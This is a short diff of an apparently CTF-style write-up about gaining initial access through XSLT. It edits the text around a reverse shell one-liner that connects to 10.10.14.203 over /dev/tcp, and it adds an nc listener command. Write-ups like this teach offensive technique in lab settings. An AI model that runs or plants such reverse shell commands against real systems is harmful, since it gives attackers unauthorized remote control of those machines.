@@ -59,9 +59,9 @@ and we prepare a python http server by using the command `python3 -m http.server
 bash -c 'bash -i >& /dev/tcp/10.10.14.203/9999 0>&1'
 ```
 
-and last thing, nc listener.
+and last thing, nc listener `nc -nlvp 9999`.
 
-and by that we get our initial access, as you can see 
+and by that we get our initial access, as you can see:
 
 ![Icon](Images/xsltrevshell.png)
 
